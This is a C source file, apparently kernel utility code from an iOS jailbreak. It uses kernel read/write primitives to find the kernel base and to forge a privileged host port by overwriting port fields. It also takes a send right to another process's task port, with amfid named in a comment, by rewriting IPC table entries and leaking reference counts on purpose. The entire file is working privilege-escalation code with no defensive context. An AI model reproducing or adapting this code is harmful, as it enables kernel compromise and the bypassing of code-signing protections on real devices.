#include <stdio.h>
#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>

#include <mach/mach.h>

#include <QiLin.h>
#include <iokit.h>
#include <common.h>

#include "kutils.h"
#include "kmem.h"
#include "offsets.h"
#include "find_port.h"

uint64_t the_realhost;

uint64_t cached_task_self_addr = 0;
uint64_t task_self_addr() {
  if (cached_task_self_addr == 0) {
    cached_task_self_addr = find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    LOG("task self: 0x%llx\n", cached_task_self_addr);
  }
  return cached_task_self_addr;
}

uint64_t ipc_space_kernel() {
  return ReadAnywhere64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}

uint64_t current_thread() {
  uint64_t thread_port = find_port_address(mach_thread_self(), MACH_MSG_TYPE_COPY_SEND);
  return ReadAnywhere64(thread_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
}

uint64_t find_kernel_base() {
  uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t realhost = ReadAnywhere64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  the_realhost = realhost;
  
  uint64_t base = realhost & ~0xfffULL;
  // walk down to find the magic:
  for (int i = 0; i < 0x10000; i++) {
    if (ReadAnywhere32(base) == 0xfeedfacf) {
      return base;
    }
    base -= 0x1000;
  }
  return 0;
}
mach_port_t fake_host_priv_port = MACH_PORT_NULL;

// build a fake host priv port
mach_port_t fake_host_priv() {
  if (fake_host_priv_port != MACH_PORT_NULL) {
    return fake_host_priv_port;
  }
  // get the address of realhost:
  uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t realhost = ReadAnywhere64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  // allocate a port
  mach_port_t port = MACH_PORT_NULL;
  kern_return_t err;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  if (err != KERN_SUCCESS) {
    LOG("failed to allocate port\n");
    return MACH_PORT_NULL;
  }
  
  // get a send right
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
  
  // locate the port
  uint64_t port_addr = find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
  
  // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
  WriteAnywhere32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_HOST_PRIV);
  
  // change the space of the port
  WriteAnywhere64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
  
  // set the kobject
  WriteAnywhere64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
  
  fake_host_priv_port = port;
  
  return port;
}

uint64_t get_proc_ipc_table(uint64_t proc) {
    uint64_t task_t = ReadAnywhere64(proc + koffset(KSTRUCT_OFFSET_PROC_TASK));
    LOG("task_t: 0x%llx\n", task_t);
    
    uint64_t itk_space = ReadAnywhere64(task_t + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    LOG("itk_space: 0x%llx\n", itk_space);
    
    uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    LOG("is_table: 0x%llx\n", is_table);
    
    return is_table;
}

/* give ourselves a send right to this proc's task port */
mach_port_t proc_to_task_port(uint64_t proc, uint64_t our_proc) {
    // allocate a new raw mach port:
    mach_port_t p = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
    mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
    
    uint64_t ports = get_proc_ipc_table(proc);
    
    // get the task port:
    uint64_t task_port = ReadAnywhere64(ports + 0x18); // first port's ie_object
    // leak some refs:
    WriteAnywhere32(task_port+4, 0x383838);
    
    uint64_t task_t = ReadAnywhere64(proc + koffset(KSTRUCT_OFFSET_PROC_TASK));
    // leak some refs
    WriteAnywhere32(task_t + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT), 0x393939);
    
    // get the address of the ipc_port of our newly allocate port
    uint64_t ipc_table = get_proc_ipc_table(our_proc);
    // point the port's ie_object to amfid's task port:
    WriteAnywhere64(ipc_table + ((p >> 8) * 0x18), task_port);
    
    // remove our receive right:
    uint32_t ie_bits = ReadAnywhere32(ipc_table + ((p >> 8) * 0x18) + 8);
    ie_bits &= ~(1<<17); // clear MACH_PORT_TYPE(MACH_PORT_RIGHT_RECEIVE)
    WriteAnywhere32(ipc_table + ((p >> 8) * 0x18) + 8, ie_bits);
    
    return p;
}
